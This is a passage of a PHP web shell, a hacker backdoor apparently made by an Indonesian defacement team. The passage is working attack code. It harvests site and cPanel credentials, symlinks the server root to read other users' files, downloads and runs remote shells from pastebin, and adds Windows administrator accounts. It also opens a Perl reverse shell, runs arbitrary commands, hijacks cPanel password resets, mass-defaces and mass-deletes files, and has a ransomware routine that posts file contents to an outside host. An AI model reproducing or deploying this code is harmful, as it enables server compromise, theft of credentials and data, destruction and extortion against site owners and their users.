            minuteHand.style.transform = `rotate(${minutesDegrees}deg)`;
    
            const hours = now.getHours();
            const hoursDegrees = ((hours / 12) * 360) + 90;
            jarum_jam.style.transform = `rotate(${hoursDegrees}deg)`;
        }
    
        setInterval(setDate, 1000)
        </script>
        ';
        die();

        ##################################
        error_reporting(0);
        $etc = file_get_contents("/etc/passwd");
        $etcz = explode("\n", $etc);
        if (is_readable("/etc/passwd")) {

            echo '<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
            echo '<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>SYMLINK</b></center></td>';

            $list = scandir("/var/named");

            foreach ($etcz as $etz) {
                $etcc = explode(":", $etz);

                foreach ($list as $domain) {
                    if (strpos($domain, ".db")) {
                        $domain = str_replace('.db', '', $domain);
                        $owner = posix_getpwuid(fileowner("/etc/valiases/" . $domain));
                        if ($owner['name'] == $etcc[0]) {
                            $i += 1;
                            echo "<tr><td class='td1'><a href='http://" . $domain . " '>" . $domain . "</a></td><center>
				<td class='td1'><font color='red'>" . $owner['name'] . "</font></center></td>
				<td class='td1'><center><a href='skylink/root" . $owner['dir'] . "/" . $dir[3] . "' target='_blank'>DIR</a></center></td>";
                        }
                    }
                }
            }
            echo "<center>Total Domains Found: " . $i . "</center><br />";
        }

        die();
        ###############################
        if (is_readable("/etc/named.conf")) {
            echo '<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
            echo '<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>SYMLINK</b></center></td>';
            $named = file_get_contents("/etc/named.conf");
            preg_match_all('%zone \"(.*)\" {%', $named, $domains);
            foreach ($domains[1] as $domain) {
                $domain = trim($domain);
                $i += 1;
                $owner = posix_getpwuid(fileowner("/etc/valiases/" . $domain));
                echo "<tr><td class='td1'><a href='http://" . $domain . " '>" . $domain . "</a></td><td class='td1'><center><font color='red'>" . $owner['name'] . "</font></center></td><td class='td1'><center><a href='skylink/root" . $owner['dir'] . "/" . $dir[3] . "' target='_blank'>DIR</a></center></td>";
            }
            echo "<center>Total Domains Found: " . $i . "</center><br />";
        } else {
            echo "<tr><td class='td1'>can't read [ /etc/named.conf ]</td></tr>";
        }

        die();
        ############################
        if (is_readable("/etc/valiases")) {
            echo '<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
            echo '<tr><td><center><b>SITE</b></center></td><td>
				<center><b>USER</b></center></td><td></center>
				<b>SYMLINK</b></center></td>';
            $list = scandir("/etc/valiases");
            foreach ($list as $domain) {
                $i += 1;
                $owner = posix_getpwuid(fileowner("/etc/valiases/" . $domain));
                echo "<tr><td class='td1'><a href='http://" . $domain . " '>" . $domain . "</a></td>
				<center><td class='td1'><font color='red'>" . $owner['name'] . "</font></center></td>
				<td class='td1'><center><a href='skylink/root" . $owner['dir'] . "/" . $dir[3] . "' target='_blank'>DIR</a></center></td>";
            }
            echo "<center>Total Domains Found: " . $i . "</center><br />";
        } else {
            echo "<tr><td class='td1'>can't read [ /etc/valiases ]</td></tr>";
        }

        die();
    }
    if ($_GET['do'] == 'newfile') {
        if ($_POST['new_save_file']) {



            $newfile = htmlspecialchars($_POST['newfile']);
            $fopen = fopen($newfile, "a+");
            if ($fopen) {
                $act = "<script>window.location='?act=edit&dir=" . $dir . "&file=" . $_POST['newfile'] . "';</script>";
            } else {
                $act = "<font color=red>permission denied</font>";
            }
        }
        echo $act;
        echo "<form method='post'>
        Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
        <input type='submit' name='new_save_file' value='Submit'>
        </form>";
        die();
    }
    if ($_GET['do'] == 'newfolder') {
        if ($_POST['new_save_folder']) {
            $new_folder = $dir . '/' . htmlspecialchars($_POST['newfolder']);
            if (!mkdir($new_folder)) {
                $act = "<font color=red>permission denied</font>";
            } else {
                $act = "<script>window.location='?dir=" . $dir . "';</script>";
            }
        }
        echo $act;
        echo "<form method='post'>
        Folder Name: <input type='text' name='newfolder' value='$dir/hacked' style='width: 450px;' height='10'>
        <input type='submit' name='new_save_folder' value='Submit'>
        </form>";
        die();
    }
    if ($_GET['do'] == 'config') {
        $etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
        $idx = mkdir("idx_config", 0777);
        $isi_htc = "Options all\nRequire None\nSatisfy Any";
        $htc = fopen("idx_config/.htaccess", "w");
        fwrite($htc, $isi_htc);
        while ($passwd = fgets($etc)) {
            if ($passwd == "" || !$etc) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_config);
                foreach ($user_config[1] as $user_idx) {
                    $user_config_dir = "/home/$user_idx/public_html/";
                    if (is_readable($user_config_dir)) {
                        $grab_config = array(
                            "/home/$user_idx/.my.cnf" => "cpanel",
                            "/home/$user_idx/.accesshash" => "WHM-accesshash",
                            "/home/$user_idx/public_html/po-content/config.php" => "Popoji",
                            "/home/$user_idx/public_html/vdo_config.php" => "Voodoo",
                            "/home/$user_idx/public_html/bw-configs/config.ini" => "BosWeb",
                            "/home/$user_idx/public_html/config/koneksi.php" => "Lokomedia",
                            "/home/$user_idx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                            "/home/$user_idx/public_html/clientarea/configuration.php" => "WHMCS",
                            "/home/$user_idx/public_html/whm/configuration.php" => "WHMCS",
                            "/home/$user_idx/public_html/whmcs/configuration.php" => "WHMCS",
                            "/home/$user_idx/public_html/forum/config.php" => "phpBB",
                            "/home/$user_idx/public_html/sites/default/settings.php" => "Drupal",
                            "/home/$user_idx/public_html/config/settings.inc.php" => "PrestaShop",
                            "/home/$user_idx/public_html/app/etc/local.xml" => "Magento",
                            "/home/$user_idx/public_html/joomla/configuration.php" => "Joomla",
                            "/home/$user_idx/public_html/configuration.php" => "Joomla",
                            "/home/$user_idx/public_html/wp/wp-config.php" => "WordPress",
                            "/home/$user_idx/public_html/wordpress/wp-config.php" => "WordPress",
                            "/home/$user_idx/public_html/wp-config.php" => "WordPress",
                            "/home/$user_idx/public_html/admin/config.php" => "OpenCart",
                            "/home/$user_idx/public_html/slconfig.php" => "Sitelok",
                            "/home/$user_idx/public_html/application/config/database.php" => "Ellislab"
                        );
                        foreach ($grab_config as $config => $nama_config) {
                            $ambil_config = file_get_contents($config);
                            if ($ambil_config == '') {
                            } else {
                                $file_config = fopen("idx_config/$user_idx-$nama_config.txt", "w");
                                fputs($file_config, $ambil_config);
                            }
                        }
                    }
                }
            }
        }
        echo "<center><a href='?dir=$dir/idx_config'><font color=blue>Done</font></a></center>";
    }
    if ($_GET['do'] == 'fake_root') {
        ob_start();
        $cwd = getcwd();
        $ambil_user = explode("/", $cwd);
        $user = $ambil_user[2];
        if ($_POST['reverse']) {
            $site = explode("\r\n", $_POST['url']);
            $file = $_POST['file'];
            foreach ($site as $url) {
                $cek = getsource("$url/~$user/$file");
                if (preg_match("/hacked/i", $cek)) {
                    echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=blue>Fake Root!</font><br>";
                }
            }
        } else {
            echo "<center><form method='post'>
        Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
        User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
        Domain: <br>
        <textarea style='width: 450px; height: 250px;' name='url'>";
            reverse($_SERVER['HTTP_HOST']);
            echo "</textarea><br>
        <input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
        </form><br>
        NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
        }
    }

    if ($_GET['do'] == 'cgi') {
        $file_cgi = "skyw.php";
        $isi_htcgi = "AddHandler cgi-script .izo";
        $htcgi = fopen(".htaccess", "w");
        $cgi_script = file_get_contents("http://pastebin.com/raw.php?i=0tBarzLA");
        $cgi = fopen($file_cgi, "w");
        fwrite($cgi, $cgi_script);
        fwrite($htcgi, $isi_htcgi);
        chmod($file_cgi, 0755);
        echo "<iframe src='skyw.php' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
        die();
    }
    if ($_GET['do'] == 'cgi2') {
        $file_cgi = "c77.php";
        $isi_htcgi = "AddHandler cgi-script .izo";
        $htcgi = fopen(".htaccess", "w");
        $cgi_script = file_get_contents("http://pastebin.com/raw.php?i=hym9jn1d");
        $cgi = fopen($file_cgi, "w");
        fwrite($cgi, $cgi_script);
        fwrite($htcgi, $isi_htcgi);
        chmod($file_cgi, 0755);
        echo "<iframe src='c77.php' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
        die();
    }
    if ($_GET['do'] == 'krdp_shell') {
        if (strtolower(substr(PHP_OS, 0, 3)) === 'win') {
            if ($_POST['create']) {
                $user = htmlspecialchars($_POST['user']);
                $pass = htmlspecialchars($_POST['pass']);
                if (preg_match("/$user/", exe("net user"))) {
                    echo "[INFO] -> <font color=red>user <font color=blue>$user</font> sudah ada</font>";
                } else {
                    $add_user   = exe("net user $user $pass /add");
                    $add_groups1 = exe("net localgroup Administrators $user /add");
                    $add_groups2 = exe("net localgroup Administrator $user /add");
                    $add_groups3 = exe("net localgroup Administrateur $user /add");
                    echo "[ RDP ACCOUNT INFO ]<br>
                    ------------------------------<br>
                    IP: <font color=blue>" . $ip . "</font><br>
                    Username: <font color=blue>$user</font><br>
                    Password: <font color=blue>$pass</font><br>
                    ------------------------------<br><br>
                    [ STATUS ]<br>
                    ------------------------------<br>
                    ";
                    if ($add_user) {
                        echo "[add user] -> <font color='blue'>Berhasil</font><br>";
                    } else {
                        echo "[add user] -> <font color='red'>Gagal</font><br>";
                    }
                    if ($add_groups1) {
                        echo "[add localgroup Administrators] -> <font color='blue'>Berhasil</font><br>";
                    } elseif ($add_groups2) {
                        echo "[add localgroup Administrator] -> <font color='blue'>Berhasil</font><br>";
                    } elseif ($add_groups3) {
                        echo "[add localgroup Administrateur] -> <font color='blue'>Berhasil</font><br>";
                    } else {
                        echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
                    }
                    echo "------------------------------<br>";
                }
            } elseif ($_POST['s_opsi']) {
                $user = htmlspecialchars($_POST['r_user']);
                if ($_POST['opsi'] == '1') {
                    $cek = exe("net user $user");
                    echo "Checking username <font color=blue>$user</font> ....... ";
                    if (preg_match("/$user/", $cek)) {
                        echo "[ <font color=blue>Sudah ada</font> ]<br>
                        ------------------------------<br><br>
                        <pre>$cek</pre>";
                    } else {
                        echo "[ <font color=red>belum ada</font> ]";
                    }
                } elseif ($_POST['opsi'] == '2') {
                    $cek = exe("net user $user global");
                    if (preg_match("/$user/", exe("net user"))) {
                        echo "[change password: <font color=blue>global</font>] -> ";
                        if ($cek) {
                            echo "<font color=blue>Berhasil</font>";
                        } else {
                            echo "<font color=red>Gagal</font>";
                        }
                    } else {
                        echo "[INFO] -> <font color=red>user <font color=blue>$user</font> belum ada</font>";
                    }
                } elseif ($_POST['opsi'] == '3') {
                    $cek = exe("net user $user /DELETE");
                    if (preg_match("/$user/", exe("net user"))) {
                        echo "[remove user: <font color=blue>$user</font>] -> ";
                        if ($cek) {
                            echo "<font color=blue>Berhasil</font>";
                        } else {
                            echo "<font color=red>Gagal</font>";
                        }
                    } else {
                        echo "[INFO] -> <font color=red>user <font color=blue>$user</font> belum ada</font>";
                    }
                } else {
                    //
                }
            } else {
                echo "-- Create RDP --<br>
                <form method='post'>
                <input type='text' name='user' placeholder='username' value='global' required>
                <input type='text' name='pass' placeholder='password' value='global' required>
                <input type='submit' name='create' value='>>'>
                </form>
                -- Option --<br>
                <form method='post'>
                <input type='text' name='r_user' placeholder='username' required>
                <select name='opsi'>
                <option value='1'>Cek Username</option>
                <option value='2'>Ubah Password</option>
                <option value='3'>Hapus Username</option>
                </select>
                <input type='submit' name='s_opsi' value='>>'>
                </form>
                ";
            }
        } else {
            echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
        }
        die();
    }
    if ($_GET['do'] == 'whois') {
        @set_time_limit(0);
        @error_reporting(0);
        function sws_domain_info($site)
        {
            $getip = @file_get_contents("http://networktools.nl/whois/$site");
            flush();
            $ip = @findit($getip, '<pre>', '</pre>');
            return $ip;
            flush();
        }
        function sws_net_info($site)
        {
            $getip = @file_get_contents("http://networktools.nl/asinfo/$site");
            $ip = @findit($getip, '<pre>', '</pre>');
            return $ip;
            flush();
        }
        function sws_site_ser($site)
        {
            $getip = @file_get_contents("http://networktools.nl/reverseip/$site");
            $ip = @findit($getip, '<pre>', '</pre>');
            return $ip;
            flush();
        }
        function sws_sup_dom($site)
        {
            $getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=" . $site . "&Search+subdomains=Find+subdomains");
            $ip = @findit($getip, '<strong>Nameservers found:</strong>', '<script type="text/javascript">');
            return $ip;
            flush();
        }
        function sws_port_scan($ip)
        {
            $list_post = array('80', '21', '22', '2082', '25', '53', '110', '443', '143');
            foreach ($list_post as $o_port) {
                $connect = @fsockopen($ip, $o_port, $errno, $errstr, 5);
                if ($connect) {
                    echo ' $ip : $o_port ??? <u style="color: blue">Open</u> <br /><br />';
                    flush();
                }
            }
        }
        function findit($mytext, $starttag, $endtag)
        {
            $posLeft = @stripos($mytext, $starttag) + strlen($starttag);
            $posRight = @stripos($mytext, $endtag, $posLeft + 1);
            return @substr($mytext, $posLeft, $posRight - $posLeft);
            flush();
        }
        echo '<br><br><center>';
        echo '
        <br />
        <div class="sc"><form method="post"><table>
        <tr><th colspan="5" style="border: 1px red solid;">Whois Site</th></tr>
        <tr><td>Site to scan </td><td>:</td><td><input type="text" name="site" size="50" style="color:Lavender;" class="inputz" value="site.com" /> � <input class="inputzbut" type="submit" style="color:Lavender;background-color:#000000" name="scan" value="Scan !" /></td></tr>
        </table></form></div>';
        if (isset($_POST['scan'])) {
            $site = @htmlentities($_POST['site']);
            if (empty($site)) {
                die('<br /><br /> Not add IP .. !');
            }
            $ip_port = @gethostbyname($site);
            echo "
       <br /><div class='sc2'>Scanning [ $site ip $ip_port ] ... </div>
       <div class='tit'> <br /><br />|-------------- Port Server ------------------| <br /></div>
       <div class='ru'> <br /><br /><pre>
       ";
            echo "" . sws_port_scan($ip_port) . " </pre></div> ";
            flush();
            echo '<div class="tit"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
       <div class="ru">
       <pre>".sws_domain_info($site)."</pre></div>';
            flush();
            echo '
       <div class="tit"> <br /><br />|-------------- Network Info ------------------| <br /></div>
       <div class="ru">
       <pre>".sws_net_info($site)."</pre> </div>';
            flush();
            echo '<div class="tit"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
       <div class="ru">
       <pre>".sws_sup_dom($site)."</pre> </div>';
            flush();
            echo '<div class="tit"> <br /><br />|-------------- Site Server ------------------| <br /></div>
       <div class="ru">
       <pre>".sws_site_ser($site)."</pre> </div>
       <div class="tit"> <br /><br />|-------------- END ------------------| <br /></div>';
            flush();
        }
        echo '</center>';
    }
    if ($_GET['sky'] == "crackcpanel") {
        echo '<!DOCTYPE HTML>
    <html> <head> 
    <title>Cpanel Cracker</title>
       </head> <center>  <form method="post"> 
       <input type="email" name="email" placeholder="tampanskyyt@gmail.com" /> 	
        <input type="submit" name="submit" value=">"/> 	 <p>&copy;PanthomSkyCodersTeamz | 2019 | Tampansky</p></form></center>';

        $IIIIIIIIIIII = get_current_user();
        $IIIIIIIIIII1 = $_SERVER['HTTP_HOST'];
        $IIIIIIIIIIlI = getenv('REMOTE_ADDR');
        if (isset($_POST['submit'])) {
            $email = $_POST['email'];
            $IIIIIIIIIIl1 = 'email:' . $email;
            $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w');
            fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1);
            fclose($IIIIIIIIII1I);
            $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w');
            fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1);
            fclose($IIIIIIIIII1I);
            $IIIIIIIIIlIl = "https://";
            $IIIIIIIIIlI1 = "2083";
            $IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1';
            $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo');
            if (!$read_named_conf) {
                echo "<h1>Akses Ga Bisa :v</h1><br><br> </pre></center>";
            } else {
                echo "<center>Salin ini Bambank <br><br></center>";
                echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">ini usernya</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> ';
                echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">OTW Cpanel</a><br><br></center>';;
            }
        }
        die();
    }
    if (isset($_POST['cmd'])) {
        echo "<pre>";
        echo system($_GET['cmd']);
        echo "</pre>";
    }
    if ($_GET['do'] == 'mass_delete') {
        function hapus_massal($dir, $namafile)
        {
            if (is_writable($dir)) {
                $dira = scandir($dir);
                foreach ($dira as $dirb) {
                    $dirc = "$dir/$dirb";
                    $lokasi = $dirc . '/' . $namafile;
                    if ($dirb === '.') {
                        if (file_exists("$dir/$namafile")) {
                            unlink("$dir/$namafile");
                        }
                    } elseif ($dirb === '..') {
                        if (file_exists("" . dirname($dir) . "/$namafile")) {
                            unlink("" . dirname($dir) . "/$namafile");
                        }
                    } else {
                        if (is_dir($dirc)) {
                            if (is_writable($dirc)) {
                                if (file_exists($lokasi)) {
                                    echo "[<font color=blue>DELETED</font>] $lokasi<br>";
                                    unlink($lokasi);
                                    $idx = hapus_massal($dirc, $namafile);
                                }
                            }
                        }
                    }
                }
            }
        }
        if ($_POST['start']) {
            echo "<div style='margin: 5px auto; padding: 5px'>";
            hapus_massal($_POST['d_dir'], $_POST['d_file']);
            echo "</div>";
        } else {
            echo "<center>";
            echo "<form method='post'>
    <font style='text-decoration: underline;'>Folder:</font><br>
    <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
    <font style='text-decoration: underline;'>Filename:</font><br>
    <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
    <input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
    </form></center>";
        }
        die;
    }
    if ($_GET['do'] == 'bconnet') {
        echo '<div id="login" style="margin-top: 10px; margin-left: 10px;">';
        echo '<form action="?page=bcon" method="get"><input type="hidden" name="page" value="bcon"/>';
        echo 'IP:<br><input type="text" name="ip" value="' . getenv("remote_addr") . '" style="margin-top: 5px;"/><br><br>';
        echo 'Port:<input type="submit" value="Connect" style="margin-left: 130px; margin-top: -4px;"/><br><input type="text" name="port" value="666" style="margin-top: 5px;"/>';
        echo '</form>';
        echo '</div>';
        if (isset($_GET['ip']) && isset($_GET['port'])) {
            $ip = $_GET['ip'];
            $port = $_GET['port'];
            $bc = fopen("/tmp/bxcon.pl", "w");
            fwrite($bc, '#!/usr/bin/perl
use Socket;
$iaddr=inet_aton("' . $ip . '") || die("Error: $!\n");
$paddr=sockaddr_in("' . $port . '", $iaddr) || die("Error: $!\n");
$proto=getprotobyname("tcp");
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("/bin/sh -i");
close(STDIN);
close(STDOUT);
close(STDERR);');
            fclose($bc);
            shell_exec("perl /tmp/bxcon.pl");
            unlink("/tmp/bxcon.pl");
        }
        echo '<p>&copy;PanthomSkyCodersTeamz | 2019 | Tampansky</p>';
        die();
    }
    if ($_GET['do'] == 'defacerid') {
        echo "<center><form method='post'>
            <u>Defacer</u>: <br>
            <input type='text' name='hekel' size='50' value='Tampansky'><br>
            <u>Team</u>: <br>
            <input type='text' name='tim' size='50' value='Panthom Sky Cyber Team'><br>
            <u>Domains</u>: <br>
            <textarea style='width: 450px; height: 150px;' name='sites' placeholder='http://www.google.com'>http://</textarea><br>
            <input type='submit' name='go' value='Submit' style='width: 450px;'>
            <p>&copy;PanthomSkyCodersTeamz | 2019 | Tampansky</p>
            </form>";
        $site = explode("\r\n", $_POST['sites']);
        $go = $_POST['go'];
        $hekel = $_POST['hekel'];
        $tim = $_POST['tim'];
        if ($go) {
            foreach ($site as $sites) {
                $zh = $sites;
                $form_url = "https://www.defacer.id/notify";
                $data_to_post = array();
                $data_to_post['attacker'] = "$hekel";
                $data_to_post['team'] = "$tim";
                $data_to_post['poc'] = 'SQL Injection';
                $data_to_post['url'] = "$zh";
                $curl = curl_init();
                curl_setopt($curl, CURLOPT_URL, $form_url);
                curl_setopt($curl, CURLOPT_POST, sizeof($data_to_post));
                curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
                curl_setopt($curl, CURLOPT_POSTFIELDS, $data_to_post);
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
                $result = curl_exec($curl);
                echo $result;
                curl_close($curl);
                echo "<br>";
            }
        }
        die();
    }
    if ($_GET['do'] == 'infosys') {

        echo '<div id="menu" >';
        echo "<ul>";
        echo "System: <font color=blue>" . $kernel . "</font><br>";
        echo "User: <font color=blue>" . $user . "</font> (" . $uid . ") Group: <font color=blue>" . $group . "</font> (" . $gid . ")<br>";
        echo "Server IP: <font color=blue>" . $ip . "</font> | Your IP: <font color=blue>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
        echo "HDD: <font color=blue>$used</font> / <font color=blue>$total</font> ( Free: <font color=blue>$freespace</font> )<br>";
        echo "Safe Mode: $sm<br>";
        echo "Disable Functions: $show_ds<br>";
        echo "User: " . $user . " (" . $uid . ") Group: " . $group . " (" . $gid . ")<br>";
        echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
        echo "<hr>";
    }
    if ($_GET['sky'] == "safemode") {
        echo '<center><font>Safe Mode Success Full <a href="?logout">CLick Here To Refresh</a></font></center><p>&copy;PanthomSkyCodersTeamz | 2019 | Tampansky</p>';
        die();
    }
    if ($_GET['do'] == 'symlink') {

        @set_time_limit(0);

        echo "<br><br><center><h1>Symlink</h1></center><br><br><center><div class=content>";

        @mkdir('skyware', 0777);
        $htaccess  = "Options all \n DirectoryIndex sky.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
        $write = @fopen('skyware/.htaccess', 'w');
        fwrite($write, $htaccess);
        @symlink('/', 'skyware/root');
        $filelocation = basename(__FILE__);
        $read_named_conf = @file('/etc/named.conf');
        if (!$read_named_conf) {
            echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
        } else {
            echo "<br><br><div class='tmp'><table border='1' bordercolor='#00ff00' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
            foreach ($read_named_conf as $subject) {
                if (eregi('zone', $subject)) {
                    preg_match_all('#zone "(.*)"#', $subject, $string);
                    flush();
                    if (strlen(trim($string[1][0])) > 2) {
                        $UID = posix_getpwuid(@fileowner('/etc/valiases/' . $string[1][0]));
                        $name = $UID['name'];
                        @symlink('/', 'skyware/root');
                        $name   = $string[1][0];
                        $iran   = '\.ir';
                        $israel = '\.il';
                        $indo   = '\.id';
                        $sg12   = '\.sg';
                        $edu    = '\.edu';
                        $gov    = '\.gov';
                        $gose   = '\.go';
                        $gober  = '\.gob';
                        $mil1   = '\.mil';
                        $mil2   = '\.mi';
                        $malay  = '\.my';
                        $china  = '\.cn';
                        $japan  = '\.jp';
                        $austr  = '\.au';
                        $porn   = '\.xxx';
                        $as     = '\.uk';
                        $calfn  = '\.ca';

                        if (
                            eregi("$iran", $string[1][0]) or eregi("$israel", $string[1][0]) or eregi("$indo", $string[1][0]) or eregi("$sg12", $string[1][0]) or eregi("$edu", $string[1][0]) or eregi("$gov", $string[1][0])
                            or eregi("$gose", $string[1][0]) or eregi("$gober", $string[1][0]) or eregi("$mil1", $string[1][0]) or eregi("$mil2", $string[1][0])
                            or eregi("$malay", $string[1][0]) or eregi("$china", $string[1][0]) or eregi("$japan", $string[1][0]) or eregi("$austr", $string[1][0])
                            or eregi("$porn", $string[1][0]) or eregi("$as", $string[1][0]) or eregi("$calfn", $string[1][0])
                        ) {
                            $name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $string[1][0] . '</div>';
                        }
                        echo "
    <tr>
     
    <td>
    <div class='dom'><a target='_blank' href=http://www." . $string[1][0] . '/>' . $name . ' </a> </div>
    </td>
     
    <td>
    ' . $UID['name'] . "
    </td>
     
    <td>
    <a href='skyware/root/home/" . $UID['name'] . "/public_html' target='_blank'>Symlink </a>
    </td>
     
    </tr></div> ";
                        flush();
                    }
                }
            }
        }

        echo "</center></table><p>&copy;PanthomSkyCodersTeamz | 2019 | Tampansky</p>";
        die();
    }

    function ransom($dir, $file)
    {
        if (isset($_POST["encrypt"])) {
            $dir = $_POST["path"];
            echo "<textarea class='form-control mb-4' rows='13' disabled=''>";
            function listFolderFiles($dir)
            {
                if (is_dir($dir)) {
                    $ffs = scandir($dir);
                    unset($ffs[array_search('.', $ffs, true)]);
                    unset($ffs[array_search('..', $ffs, true)]);
                    if (count($ffs) < 1)
                        return;
                    foreach ($ffs as $ff) {
                        $files = $dir . "/" . $ff;
                        if (!is_dir($files)) {
                            /* encrypt file */
                            $file = file_get_contents($files);
                            $_a = base64_encode($file);
                            /* proses curl */
                            $ch = curl_init();
                            curl_setopt($ch, CURLOPT_URL, 'http://encrypt.indsc.me/api.php?type=encrypt');
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt($ch, CURLOPT_POSTFIELDS, "text=$_a");
                            $x = json_decode(curl_exec($ch));
                            if ($x->status == 'success') {
                                $_enc = base64_decode($x->data);
                                rename($files, $files . ".indsc");
                                echo "[+]$files => Success Encrypted\n";
                            }
                        }
                        if (is_dir($dir . '/' . $ff)) listFolderFiles($dir . '/' . $ff);
                    }
                    $sc = $_POST["sc"];
                    $index = file_get_contents("$sc");
                    $_o = fopen($dir . "/index.php", "w");
                    fwrite($_o, $index);
                    fclose($_o);
                    echo "\n[+] Success Encrypt";
                } else {
                    echo "\nBukan dir";
                }
            }
            listFolderFiles($dir);
            echo "</textarea><br/>";
        } else {
            echo '<form method="post">
			<div class="form-group">
				<hr color="white">
				<h4 class="text-center mb-4"><i class="fa fa-lock"></i> Ransomware</h4>
                <textarea type="text" name="sc" class="form-control" value="Your Site Have Been Encrypt">Your Site Have Been Encrypt</textarea>
				<label>Pilih Directory :</label>
				<div class="form-group input-group">
					<div class="input-group-prepend">
						<div class="input-group-text"><i class="fa fa-home"></i></div>
                    </div>
					<input type="text" name="path" class="form-control" value="' . $dir . '"/>
				</div>
				<input type="submit" name="encrypt" class="btn btn-danger btn-block" value="Encrypt"/>
			</div>
		</form><hr color="white">';
        }
        die;
    }
    if ($_GET['go'] == 'ransom') {
        ransom($dir, $file);
    }
    if ($_GET['sky'] == "massdeface") {
        if (isset($_POST['base_dir'])) {
            if (!file_exists($_POST['base_dir']))
                die($_POST['base_dir'] . " Not Found !<br>");

            if (!is_dir($_POST['base_dir']))
                die($_POST['base_dir'] . " Is Not A Directory !<br>");

            @chdir($_POST['base_dir']) or die("Cannot Open Directory");

            $files = @scandir($_POST['base_dir']) or die("Fuck u -_- <br>");

            foreach ($files as $file) :
                if ($file != "." && $file != ".." && @filetype($file) == "dir") {
                    $index = getcwd() . "/" . $file . "/" . $_POST['andela'];
                    if (file_put_contents($index, $_POST['index']))
                        echo "<hr color='white'><font color='black'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font>";
                }
            endforeach;
        }
        echo "<center><form method='POST'>";
        echo "
    <hr color='white'><font color='white'>Target Folder</font><br>
    <input type='text' name='base_dir' value='" . getcwd() . "'><br><br>";
        echo "<font color='white'>Name of File</font><br><input type='text' name='andela' value='index.php'><br>";
        echo "<font color='white'>Script Deface</font><br><textarea name='index'>Hacked by Tampansky</textarea><br>";
        echo "<input type='submit' value='>'><p>&Copy;PanthomSkyCodersTeamz | 2019 | Tampansky</p></form></center>";
        die();
    }
    if ($_GET['sky'] == "jso") {
        echo '
                <hr color="white"><form method="post" name="charCodeAt">
                <textarea name="input" style="width: 300px;height: 200px;" placeholder="PASTE HERE YOUR TEXT"></textarea>
                <input type="button" onclick="runCharCodeAt()" value="CLick">
                <textarea name="output" placeholder="DISINI AKAN MENGHASILKAN ANAK! Upss Maksudnya charcode" style="width: 300px;height: 200px;"></textarea><br>
                </form>
                <hr color="white">';
        echo '<p>&copy;PanthomSkyCodersTeamz | 2019 | Tampansky</p>';
        die();
    }

    if ($_GET['sky'] == "root") {
        echo "<form method='post' enctype='multipart/form-data'>
    <input type='file' name='idx_file'>
    <input type='submit' name='upload' value='>'>
    </form>";
        $root = $_SERVER['DOCUMENT_ROOT'];
        $files = $_FILES['idx_file']['name'];
        $dest = $root . '/' . $files;
        if (isset($_POST['upload'])) {
            if (is_writable($root)) {
                if (@copy($_FILES['idx_file']['tmp_name'], $dest)) {
                    $web = "http://" . $_SERVER['HTTP_HOST'] . "/";
                    echo "sukses COk..!!!!! -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
                } else {
                    echo "gagal upload di document root.";
                }
            } else {
                if (@copy($_FILES['idx_file']['tmp_name'], $files)) {
